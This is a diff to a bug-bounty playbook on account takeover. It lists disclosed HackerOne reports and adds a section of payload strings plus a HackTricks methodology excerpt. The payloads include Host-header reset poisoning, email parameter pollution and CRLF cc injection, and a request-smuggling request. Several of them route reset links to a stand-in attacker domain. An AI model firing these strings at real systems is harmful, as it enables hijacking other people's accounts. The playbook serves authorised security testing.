@@ -1,7 +1,7 @@
 # Real-World Playbook — Account Takeover (ATO)
 
 **Class:** `account-takeover` · **Coverage-matrix tier:** 0 · **Hunter2:** /auth-hunt · tools/h1_oauth_tester.py · tools/jwt_scanner.py · tools/h1_idor_scanner.py · **Skill:** auth-attacks
-**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)
+**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)
 
 ## Why it pays (real bounty signal)
 Top disclosed Account Takeover reports peak at **$35,000**. Rewarded across: Chaturbate, GitLab, HackerOne, LY Corporation, Mail.ru, New Relic, Superhuman (formerly Grammarly), TikTok.
@@ -9,8 +9,8 @@ Top disclosed Account Takeover reports peak at **$35,000**. Rewarded across: Cha
 ## How real hackers found it — top disclosed reports
 *(title = the actual technique; open the report for the full PoC)*
 
-- **Account Takeover via Password Reset without user interactions** — GitLab, $35,000 · 960👍 · [2293343](https://hackerone.com/reports/2293343)
-- **Account takeover via leaked session cookie** — HackerOne, $20,000 · 1635👍 · [745324](https://hackerone.com/reports/745324)
+- **Account Takeover via Password Reset without user interactions** — GitLab, $35,000 · 968👍 · [2293343](https://hackerone.com/reports/2293343)
+- **Account takeover via leaked session cookie** — HackerOne, $20,000 · 1640👍 · [745324](https://hackerone.com/reports/745324)
 - **Account Takeover via Authentication Bypass in TikTok Account Recovery** — TikTok, $12,000 · 171👍 · [2443228](https://hackerone.com/reports/2443228)
 - **Ability to DOS any organization's SSO and open up the door to account takeovers** — Superhuman (formerly Grammarly), $10,500 · 259👍 · [976603](https://hackerone.com/reports/976603)
 - **password reset token leaking allowed for ATO of an Uber account** — Uber, $10,000 · 100👍 · [173551](https://hackerone.com/reports/173551)
@@ -199,6 +199,88 @@ https://hackerone.com/reports/129873
 ```
 https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
 ```
+
+## Real payloads
+*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*
+
+### PayloadsAllTheThings
+```
+    POST https://example.com/reset.php HTTP/1.1
+    Accept: */*
+    Content-Type: application/json
+    Host: [ATTACKER.DOMAIN.TLD]
+```
+```
+# parameter pollution
+email=victim@mail.com&email=hacker@mail.com
+
+# array of emails
+{"email":["victim@mail.com","hacker@mail.com"]}
+
+# carbon copy
+email=victim@mail.com%0A%0Dcc:hacker@mail.com
+email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+
+# separator
+email=victim@mail.com,hacker@mail.com
+email=victim@mail.com%20hacker@mail.com
+email=victim@mail.com|hacker@mail.com
+```
+```
+    POST /api/changepass
+    [...]
+    ("form": {"email":"victim@email.com","password":"securepwd"})
+```
+```
+    git clone https://github.com/defparam/smuggler.git
+    cd smuggler
+    python3 smuggler.py -h
+```
+```
+    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
+    X: 
+```
+```
+    GET /  HTTP/1.1
+    Transfer-Encoding: chunked
+    Host: something.com
+    User-Agent: Smuggler/v1.0
+    Content-Length: 83
+
+    0
+
+    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
+    X: X
+```
+
+## Real attacker flow / methodology
+*(how real hunters approach this class step by step)*
+
+### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
+### Account Takeover
+
+
+#### **Authorization Issue**
+
+The email of an account should be attempted to be changed, and the confirmation process **must be examined**. If found to be **weak**, the email should be changed to that of the intended victim and then confirmed.<sup>[[2]](#references)</sup>
+
+#### **Unicode Normalization Issue**
+
+1. The account of the intended victim `victim@gmail.com`
+2. An account should be created using Unicode\
+   for example: `vićtim@gmail.com`<sup>[[2]](#references)</sup>
+
+As explained in [**this talk**](https://www.youtube.com/watch?v=CiIyaZ3x49c), the previous attack could also be done abusing third party identity providers:<sup>[[10]](#references)</sup>
+
+- Create an account in the third party identity with similar email to the victim using some unicode character (`vićtim@company.com`).
+  - The third party provider shouldn't verify the email
+  - If the identity provider verifies the email, maybe you can attack the domain part like: `victim@ćompany.com` and register that domain and hope that the identity provider generates the ascii version of the domain while the victim platform normalize the domain name.
+- Login via this identity provider in the victim platform who should normalize the unicode character and allow you to access the victim account.
+
+##### Unicode/email parser disagreement
+
+
+*(truncated — open the source link for the full method)*
 
 ## Chaining — always ask "what does this unlock?"
 - This IS the top chain sink — route IDOR / open-redirect / XSS / reset-poisoning / OAuth here
